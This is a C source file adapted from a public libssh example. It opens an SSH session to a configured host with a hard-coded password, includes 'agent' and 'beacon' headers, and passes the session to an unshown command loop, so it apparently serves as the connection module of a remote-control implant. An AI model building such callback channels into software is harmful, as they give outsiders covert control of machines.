/*
 * connect_ssh.c
 * This file contains an example of how to connect to a
 * SSH server using libssh
 */

/*
Copyright 2009 Aris Adamantiadis
This file is part of the SSH Library
You are free to copy this file, modify it in any way, consider it being public
domain. This does not apply to the rest of the library though, but it is
allowed to cut-and-paste working code from this file to any license of
program.
The goal is to show the API in action. It's not a reference on how terminal
clients must be made or how a client should react.
 */

#include "agent.h"
#include "config.h"
#include "beacon.h"

void remchar(char *, char, char *);
int authenticate_console(ssh_session);
ssh_session connect_ssh(const char *, const char *);

void remchar(char *msg, char rem, char *buff){
    int size;

    for(size = 0; msg[size] != '\0'; ++size);

    int loop = 0;
	int index = 0;
	while(loop <= size){
        if (msg[loop] != rem){
        	buff[index] = msg[loop];
			index++;
		}
        loop++;
	}
}

int authenticate_console(ssh_session session){
	/*Do authentication through terminal. Trying to get rid of this :)*/
  	int rc;
  	int method;
  	char *banner;

  	// Try to authenticate
  	rc = ssh_userauth_none(session, NULL);
  	if (rc == SSH_AUTH_ERROR) {
    	fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));;
    	return rc;
  	}

  	method = ssh_auth_list(session);
  	while (rc != SSH_AUTH_SUCCESS) {
    	// Try to authenticate with password
    	if (method & SSH_AUTH_METHOD_PASSWORD) {
      		rc = ssh_userauth_password(session, NULL, GLOB_LOGIN);
      		if (rc == SSH_AUTH_ERROR) {
      			fprintf(stderr,"[-] Authentication failed: %s\n",ssh_get_error(session));
        		return rc;
      		} else if (rc == SSH_AUTH_SUCCESS) {
        		break;
      		}
    	}
  	}

  	banner = ssh_get_issue_banner(session);
  	if (banner) {
    	printf("%s\n",banner);
    	free(banner);
  	}

  	return rc;
}

ssh_session connect_ssh(const char *host, const char *user){
	/*Connect to server*/
    ssh_session session;
    int auth=0;
	printf("Attempting to connect to %s (%s)\n", host, PORT);

	// initialize ssh session structure
    session=ssh_new();
    if (session == NULL) {
        return NULL;
    }

	// check and set username
	if(user != NULL){
        if (ssh_options_set(session, SSH_OPTIONS_USER, user) < 0) {
        	ssh_disconnect(session);
            return NULL;
        }
    }

	// set target host
    if (ssh_options_set(session, SSH_OPTIONS_HOST, host) < 0) {
        return NULL;
    }

	// set target port
	if (ssh_options_set(session, SSH_OPTIONS_PORT_STR, PORT)){
		return NULL;
	}
	
	// do the connection
    if(ssh_connect(session)){
        fprintf(stderr,"Connection failed : %s\n",ssh_get_error(session));
        ssh_disconnect(session);
        return NULL;
    }

	// get password
    auth=authenticate_console(session);
    if(auth==SSH_AUTH_SUCCESS){
        return session;
    } else if(auth==SSH_AUTH_DENIED){
        fprintf(stderr,"Authentication failed\n");
    } else {
        fprintf(stderr,"Error while authenticating : %s\n",ssh_get_error(session));
    }
    ssh_disconnect(session);
    return NULL;
}

int direct_forwarding(ssh_session session)
{
	/*EXAMPLE FOR NOW*/ 
  	ssh_channel forwarding_channel;
  	int rc = 0;
 	char *http_get = "GET / HTTP/1.1\nHost: www.google.com\n\n";
  	int nbytes, nwritten;

	forwarding_channel = ssh_channel_new(session);
	if (forwarding_channel == NULL) {
    	return rc;
  	}

  	rc = ssh_channel_open_forward(forwarding_channel, "www.google.com", 80, "localhost", 5555);
  	if (rc != SSH_OK)
  	{
    	ssh_channel_free(forwarding_channel);
    	return rc;
  	}

  	nbytes = strlen(http_get);
  	nwritten = ssh_channel_write(forwarding_channel, http_get, nbytes);

  	if (nbytes != nwritten)
  	{
    	ssh_channel_free(forwarding_channel);
    	return SSH_ERROR;
  	}
  
  	ssh_channel_free(forwarding_channel);
  	return SSH_OK;
}


int main(int argc, char* argv[]){
    ssh_session session = connect_ssh(HOST, GLOB_ID);

	if(session == NULL){
		printf("Failed to create SSH session\n");
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		return 1;
	}

	func_loop(session);


	ssh_disconnect(session);
	ssh_free(session);
	ssh_finalize();
	printf("Successfully disconnected from server\n");
    return 0;
}

